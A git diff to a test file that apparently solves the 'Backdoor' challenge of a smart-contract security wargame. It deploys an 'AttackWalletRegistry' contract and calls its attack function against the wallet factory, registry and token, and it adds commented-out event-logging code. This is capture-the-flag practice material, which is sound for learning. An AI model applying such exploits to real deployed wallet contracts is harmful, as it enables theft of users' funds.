@@ -37,6 +37,42 @@ describe('[Challenge] Backdoor', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        // walletFactory = this.walletFactory.connect(attacker);
+        // await walletFactory.createProxyWithCallback(this.masterCopy.address, "0x00000000", 0, this.walletRegistry.address);
+
+        attack = await (await ethers.getContractFactory('AttackWalletRegistry', attacker)).deploy(
+            this.walletFactory.address,
+            this.masterCopy.address,
+            this.walletRegistry.address,
+            users,
+            this.token.address
+        );
+        res = await attack.attack();
+
+        // I like to use this + test events for debugging, I'll just leave this here :)
+        /*
+        let abi = [
+            "event Transfer(address indexed from, address indexed to, uint256 value)",
+            "event Approval(address indexed owner, address indexed spender, uint256 value)"
+            ];
+        let iface = new ethers.utils.Interface(abi);
+
+        receipt = await res.wait();
+        for (log of receipt.logs)
+        {
+            try
+            {
+                let l = await iface.parseLog(log);
+                if (l.name === "Transfer")
+                    console.log("Transfer From: " + l.args.from + ", To: " + l.args.to + ", value: " + l.args.value);
+                else if (l.name === "Approval")
+                    console.log("Approval Owner: " + l.args.owner + ", spender: " + l.args.spender + ", value: " + l.args.value);
+                else
+                    console.log("Event: " + l.name);
+            }
+            catch {}
+        }
+        */
     });
 
     after(async function () {
